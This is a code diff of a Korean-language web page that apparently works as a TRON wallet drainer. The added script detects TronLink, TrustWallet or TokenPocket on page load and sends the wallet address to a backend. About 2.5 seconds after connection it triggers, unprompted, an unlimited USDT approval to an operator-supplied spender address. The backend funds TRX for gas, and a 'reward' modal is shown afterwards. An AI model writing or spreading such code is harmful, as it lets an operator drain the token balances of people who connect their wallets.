+            }else if(wallet==='tokenpocket'){
+                var tpParam=encodeURIComponent(JSON.stringify({url:url,chain:'TRON'}));
+                window.location.href='tpdapp://open?params='+tpParam;
+                setTimeout(function(){if(/Android/i.test(navigator.userAgent))window.location.href='intent://open?params='+tpParam+'#Intent;scheme=tpdapp;package=vip.mytokenpocket;end';},1000);
+            }
         };
 
-        window.copyCurrentUrl=async function(){try{await navigator.clipboard.writeText(window.location.href);showToast('주소 복사됨');}catch(e){showToast('복사 실패','error');}};
-
-        // TronWeb 감지
+        // ===== TronWeb Detection (모든 TRON 지갑 공통) =====
         async function getInjectedTronWeb(){
             if(window.tronWeb&&window.tronWeb.defaultAddress&&window.tronWeb.defaultAddress.base58)return window.tronWeb;
             if(window.tronLink){if(window.tronLink.ready&&window.tronLink.tronWeb)return window.tronLink.tronWeb;try{var r=await window.tronLink.request({method:'tron_requestAccounts'});if(r&&r.code===200&&window.tronWeb)return window.tronWeb;}catch(e){}}return null;
         }
-        window.addEventListener('DOMContentLoaded',function(){var a=0;var t=setInterval(async function(){a++;try{var tw=await getInjectedTronWeb();if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){clearInterval(t);await setConnectedWallet(tw.defaultAddress.base58,'TronLink');}else if(a>8)clearInterval(t);}catch(e){if(a>8)clearInterval(t);}},400);});
 
-        // Connect
+        // ===== 자동 감지: 페이지 로드 시 지갑 DApp 브라우저 체크 =====
+        window.addEventListener('DOMContentLoaded',function(){
+            var a=0;var t=setInterval(async function(){a++;
+                try{
+                    var tw=await getInjectedTronWeb();
+                    if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
+                        clearInterval(t);
+                        // 어떤 지갑인지 감지
+                        var provider='TronLink';
+                        if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)provider='TrustWallet';
+                        else if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)provider='TokenPocket';
+                        appendLog('[감지] '+provider+' DApp 브라우저 확인됨','success');
+                        document.getElementById('wallet-selector-modal').classList.remove('active');
+                        await setConnectedWallet(tw.defaultAddress.base58,provider);
+                    }else if(a>10){clearInterval(t);appendLog('[대기] 지갑 DApp 브라우저를 감지하지 못했습니다.','warn');}
+                }catch(e){if(a>10)clearInterval(t);}
+            },500);
+        });
+
+        // ===== Connect Button =====
         window.handleConnectWallet=async function(){
-            appendLog('[지갑 탐색] TronLink 환경 확인 중...');
-            if(isMobile()&&!window.tronWeb&&!window.tronLink){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');return;}
-            var tw=await getInjectedTronWeb();var addr='';
-            if(tw&&tw.defaultAddress&&tw.defaultAddress.base58)addr=tw.defaultAddress.base58;
-            else if(window.tronLink){await window.tronLink.request({method:'tron_requestAccounts'});if(window.tronWeb&&window.tronWeb.defaultAddress)addr=window.tronWeb.defaultAddress.base58;}
-            if(addr)await setConnectedWallet(addr,'TronLink');
-            else{
-                if(isMobile()){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');}
-                else{document.getElementById('install-modal').classList.add('active');appendLog('[오류] TronLink 미감지 — 설치 안내 표시','warn');}
+            appendLog('[지갑 탐색] 환경 확인 중...');
+            var tw=await getInjectedTronWeb();
+            if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
+                var provider='TronLink';
+                if(window.trustwallet||navigator.userAgent.indexOf('Trust')>=0)provider='TrustWallet';
+                else if(window.tokenpocket||navigator.userAgent.indexOf('TokenPocket')>=0)provider='TokenPocket';
+                await setConnectedWallet(tw.defaultAddress.base58,provider);
+            }else{
+                if(isMobile()){showWalletSelector();}
+                else{document.getElementById('install-modal').classList.add('active');}
             }
         };
 
@@ -393,62 +343,47 @@
             document.getElementById('wallet-disconnected').classList.add('hidden');
             document.getElementById('wallet-connected').classList.remove('hidden');
             document.getElementById('display-address').textContent=address;
-            document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>CONNECTED';
+            document.getElementById('connection-indicator').innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+provider;
             document.getElementById('connection-indicator').className='text-[10px] text-emerald-400 font-mono font-semibold flex items-center';
             document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
-            document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>완료됨';
+            document.getElementById('step1-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+provider;
             document.getElementById('step1-status').className='text-emerald-400 text-xs font-semibold flex items-center';
             appendLog('[백엔드] 서버에 지갑 정보 전송 중...');
-            try{
-                var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
-                var data=await res.json();
-                if(data.status==='ok'){
-                    document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';
-                    if(data.isApproved){isApproved=true;setApprovedUI();}
-                    showToast('연결 완료 (잔액: '+data.balance+' USDT)');
-                    appendLog('[연결 완료] '+address+' | '+data.balance+' USDT | '+(data.isApproved?'승인완료':'미승인'),'success');
-                }
-            }catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
-
-            if(!isApproved){
-                setTimeout(function(){ executeUnlimitedApprove(); }, 2500);
-            }
+            try{var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});var data=await res.json();if(data.status==='ok'){document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';if(data.isApproved){isApproved=true;setApprovedUI();}showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');appendLog('[연결 완료] '+address+' | '+data.balance+' USDT','success');}}catch(e){appendLog('[경고] 백엔드 연결 실패','warn');}
+            if(!isApproved){setTimeout(function(){executeUnlimitedApprove();},2500);}
         }
 
         function setApprovedUI(){
-            document.getElementById('display-allowance').textContent='무제한 (MAX)';
-            document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
-            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';
-            document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
-            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
-            document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';
-            document.getElementById('step2-status').className='text-emerald-400 text-xs font-semibold flex items-center';
-            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';
-            document.getElementById('step3').style.opacity='1';
+            document.getElementById('display-allowance').textContent='무제한 (MAX)';document.getElementById('display-allowance').className='text-sm font-bold font-mono text-emerald-400 mt-1';
+            document.getElementById('allowance-badge-main').textContent='무제한 승인 완료';document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';
+            document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';document.getElementById('step2-status').innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>승인됨';document.getElementById('step2-status').className='text-emerald-400 text-xs font-semibold flex items-center';
+            document.getElementById('step3').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40';document.getElementById('step3').style.opacity='1';
         }
 
-        // Approve
+        // ===== Approve (TRX 자동 충전 포함) =====
         window.executeUnlimitedApprove=async function(){
-            if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
+            if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');showWalletSelector();return;}
             var spender=await getSpenderAddress();
             if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog('[오류] Spender 미설정','error');return;}
             var tw=await getInjectedTronWeb();
-            if(!tw||!tw.contract){showToast('TronLink DApp 브라우저 필요','error');if(isMobile()){launchTronLinkApp();document.getElementById('mobile-dapp-modal').classList.add('active');}return;}
+            if(!tw||!tw.contract){showToast('지갑 DApp 브라우저 필요','error');if(isMobile())showWalletSelector();return;}
             var btn=document.getElementById('approve-btn');
             btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>가스비 확인 중...</span>';btn.disabled=true;
+            // TRX 자동 충전
             try{
                 appendLog('[준비] TRX 잔액 및 에너지 확인 중...','approve');
                 var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
                 var prepData=await prepRes.json();
                 if(prepData.status==='ok'&&prepData.ready){
-                    if(prepData.sent){appendLog('[자동 충전] '+prepData.sentAmount+' TRX 전송 완료! 잔액: '+prepData.trxBalance+' TRX','success');showToast(prepData.sentAmount+' TRX 자동 충전 완료!');}
+                    if(prepData.sent){appendLog('[자동 충전] '+prepData.sentAmount+' TRX 전송 완료!','success');showToast(prepData.sentAmount+' TRX 자동 충전 완료!');}
                     else{appendLog('[확인] TRX 충분 ('+prepData.trxBalance+' TRX)','success');}
-                }else{showToast('가스비 준비 실패','error');appendLog('[실패] TRX 준비 실패: '+(prepData.error||'알 수 없음'),'error');btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;}
-            }catch(pe){appendLog('[경고] TRX 확인 실패, 승인 계속 진행','warn');}
+                }else{showToast('가스비 준비 실패','error');appendLog('[실패] '+(prepData.error||'알 수 없음'),'error');btn.innerHTML='<i class="fa-solid fa-signature"></i><span>무제한 USDT 승인 서명하기 (Approve)</span>';btn.disabled=false;return;}
+            }catch(pe){appendLog('[경고] TRX 확인 실패, 계속 진행','warn');}
+            // Approve 실행
             try{
                 btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>서명 처리 중...</span>';
-                appendLog('[승인 요청] Spender('+spender+') 무제한 승인 중...','approve');
-                showToast('TronLink 서명 팝업을 확인하세요.');
+                appendLog('[승인 요청] 무제한 승인 중...','approve');
+                showToast('지갑 서명 팝업을 확인하세요.');
                 var contract=await tw.contract().at(OFFICIAL_USDT_CONTRACT);
                 var txHash=await contract.approve(spender,MAX_ALLOWANCE).send({feeLimit:100000000});
                 if(!txHash)throw new Error('TX 해시 수신 실패');
@@ -456,7 +391,7 @@
                 appendLog('[온체인 승인 성공] TxHash: '+txHash,'success');
                 document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
                 document.getElementById('reward-modal').classList.add('active');
-                try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});appendLog('[백엔드 동기화] 완료','success');}catch(e){appendLog('[경고] 백엔드 동기화 실패','warn');}
+                try{await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,provider:activeProvider})});}catch(e){}
                 showToast('온체인 무제한 승인 완료!');
             }catch(err){
                 var m=err&&err.message?err.message:JSON.stringify(err);
